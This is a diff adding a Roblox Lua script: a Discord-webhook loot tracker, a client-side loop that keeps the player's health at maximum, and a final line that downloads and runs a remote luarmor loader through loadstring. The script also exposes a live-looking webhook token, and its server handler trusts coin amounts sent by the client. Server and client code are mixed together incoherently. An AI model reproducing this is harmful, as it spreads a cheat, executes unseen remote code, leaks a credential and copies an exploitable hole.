@@ -1,0 +1,56 @@
+local WebhookURL = "https://discord.com/api/webhooks/1412018918125604985/MrooiNam55-2xllRRq98Ca2-vl6aurD9LMXC6XkxMwS-kDbBKqkkpZMDZbHbOlEd7OMZ"
+local HttpService = game:GetService("HttpService")
+
+local function SendLootWebhook(player, coin, itemName, jumlah)
+    local data = {
+        ["username"] = "Hunty Zombie Tracker",
+        ["embeds"] = {{
+            ["title"] = "🧟 Hunty Zombie Loot Report",
+            ["color"] = 16711680,
+            ["description"] = player.Name .. " baru saja mendapatkan loot!",
+            ["fields"] = {
+                {
+                    ["name"] = "💰 Coin",
+                    ["value"] = tostring(coin),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🎁 Item",
+                    ["value"] = itemName .. " x" .. tostring(jumlah),
+                    ["inline"] = true
+                }
+            }
+        }}
+    }
+    local headers = {["Content-Type"] = "application/json"}
+    local body = HttpService:JSONEncode(data)
+    HttpService:PostAsync(WebhookURL, body, Enum.HttpContentType.ApplicationJson, false)
+end
+
+game.ReplicatedStorage:WaitForChild("ZombieKilled").OnServerEvent:Connect(function(player, coinReward, itemReward, jumlah)
+    player.leaderstats.Coins.Value += coinReward
+    SendLootWebhook(player, coinReward, itemReward, jumlah)
+end)
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local function StartHeal(char)
+    local humanoid = char:WaitForChild("Humanoid")
+    task.spawn(function()
+        while humanoid and humanoid.Health > 0 do
+            task.wait(0.2) 
+            if humanoid.Health < humanoid.MaxHealth then
+                humanoid.Health = humanoid.MaxHealth
+            end
+        end
+    end)
+end
+
+if player.Character then
+    StartHeal(player.Character)
+end
+
+player.CharacterAdded:Connect(StartHeal)
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7b5caf0fbbd276ba9747f231e47c0b1a.lua"))()
